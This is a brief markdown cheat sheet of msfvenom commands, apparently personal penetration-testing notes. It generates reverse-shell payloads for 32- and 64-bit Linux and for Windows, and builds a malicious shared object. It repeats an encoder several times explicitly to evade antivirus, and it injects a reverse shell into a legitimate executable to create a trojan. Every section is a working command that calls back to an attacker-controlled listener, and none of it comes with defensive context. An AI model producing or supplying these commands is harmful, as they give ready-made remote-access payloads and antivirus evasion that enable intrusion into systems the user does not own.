## Reverse shell 32 bit:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.18 LPORT=6666 -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform linux
```

## Reverse shell 64 bit:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.
174 LPORT=13005 -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f elf -a x64 --platform linux
```

## Creat an elf.so file (useful for some exploits)

```
msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=192.168.92.134 LPORT=4444 -f elf-so -o payload.so
```

## Run encoder multiple times in order avoid AV

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

## Inject payload into executable

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```

